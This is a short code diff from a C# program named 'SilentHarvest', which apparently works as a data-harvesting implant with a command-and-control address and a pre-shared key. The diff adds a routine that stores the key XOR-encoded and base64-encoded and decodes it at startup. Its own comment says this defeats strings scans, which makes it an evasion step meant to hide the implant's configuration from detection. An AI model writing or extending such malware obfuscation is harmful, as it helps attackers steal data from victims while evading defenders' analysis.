@@ -10,8 +10,29 @@ namespace SilentHarvest
     {
         private static string c2 = Cfg.C2;
         private static string outFile = null;
-        private static string psk = Cfg.PSK;
+        private static string psk = DecodePsk();
         private static string only = null;
+
+        /// <summary>Config stores the PSK XOR+base64 (defeats casual strings
+        /// scans only). Decode it once at startup.</summary>
+        private static string DecodePsk()
+        {
+            try
+            {
+                byte[] x = Convert.FromBase64String(Cfg.PskEnc);
+                string hex = Cfg.PskXorHex;
+                byte[] k = new byte[hex.Length / 2];
+                for (int i = 0; i < k.Length; i++)
+                    k[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
+                byte[] p = new byte[x.Length];
+                for (int i = 0; i < x.Length; i++) p[i] = (byte)(x[i] ^ k[i % k.Length]);
+                return System.Text.Encoding.UTF8.GetString(p);
+            }
+            catch
+            {
+                return "";
+            }
+        }
 
         private static int Main(string[] argv)
         {
